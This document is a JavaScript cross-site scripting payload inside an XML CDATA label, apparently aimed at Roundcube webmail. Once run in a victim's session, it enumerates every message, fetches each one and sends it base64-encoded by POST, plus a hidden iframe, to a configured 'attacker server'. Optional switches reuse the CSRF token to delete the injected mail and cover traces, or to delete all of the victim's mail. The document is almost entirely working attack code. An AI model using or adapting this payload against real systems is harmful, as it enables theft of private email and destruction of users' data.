<label id="xss"><![CDATA[
<script type="text/javascript">

//GET LOCATION
base_url = document.location.toString().split("?")[0];

//Attacker server to receive mails
attacker_ip = "127.0.0.1:8000";
attacker_server = "https://" + attacker_ip + "/";

//Delete evil xxs mail (no traces left behind)
delete_xss_mail = false;
//delete_xss_mail = true;

//Delete all mails (need I point out that this is evil and unethical)
delete_all_mails = false;
//delete_all_mails = true;

//Load Function
function load(url) {
	resp = fetch(url).then(response => {
		return response.text().then((text) => {return text;});
	});
	return resp;
}

//GET IDS
async function get_mail_ids() {
	params = "?_task=mail&_action=list&_refresh=1&_remote=1";
	resp = await load(base_url + params);
	x = JSON.parse(resp).exec.split("this.add_message_row(");
	x.shift(); //Eliminate first elem
	ids = [];
	x.forEach(i =>
		ids.push(i.split(",")[0])
	);
	return ids;
}

//GET Mail
async function get_mail(id) {
        params = "?_task=mail&_uid="+id+"&_action=show";
        resp = await load(base_url + params);
        return resp;
}

//GET Mails
async function get_mail_promisses() {
	mail_promises = [];
	ids = await get_mail_ids();
	ids.forEach(id => mail_promises.push(get_mail(id)));
        return mail_promises;
}

//Send mails to attacker
async function send_mails(attacker_server){
	mail_promises = await get_mail_promisses();

	//Create hidden iframe to exfil mail via src
	var ifrm = document.createElement("iframe");
        ifrm.setAttribute("src", attacker_server+"?initial_request");
	ifrm.setAttribute("hidden", "true");
	document.body.append(ifrm);

	mail_promises.forEach(mail =>
		mail.then(resp => {
				fetch(
					attacker_server, {
					method: 'POST',
					body: btoa(resp)
					}
				);
		})
	);
}


//Get Request Token
async function get_rc_token(){
	resp = await load(base_url);
	token = resp.split('"request_token":"')[1].split('"')[0];
	return token;
}

//Delete XSS Mail
async function do_delete_xss_mail(){
	//Current mail (identified by "_uid") contains the xss
	id = JSON.parse('{"' + decodeURI(document.location.search.substring(1).replace(/&/g, "\",\"").replace(/=/g,"\":\"")) + '"}')["_uid"]
	//CSRF Token
	token = await get_rc_token();

	params = "?_task=mail&_action=delete";
	url = base_url + params;

	fetch(
		url, {
			method: 'POST',
			headers: {
				'Content-Type': 'application/x-www-form-urlencoded',
				'X-Roundcube-Request': token,
			},
			body: "_uid="+id+"&_remote=1"
		}
	)
}

//Delete all mails
async function do_delete_all_mails(){
	//CSRF Token
	token = await get_rc_token();

	params = "?_task=mail&_action=delete";
	url = base_url + params;

	fetch(
		url, {
			method: 'POST',
			headers: {
				'Content-Type': 'application/x-www-form-urlencoded',
				'X-Roundcube-Request': token,
			},
			body: "_uid=*&_remote=1"
		}
	)
}

//Fun happens here
function main(){
	send_mails(attacker_server);
	if(delete_xss_mail === true){
		do_delete_xss_mail();
	}
	if(delete_all_mails === true){
		do_delete_all_mails();
	}
}

main();

</script>
]]></label>
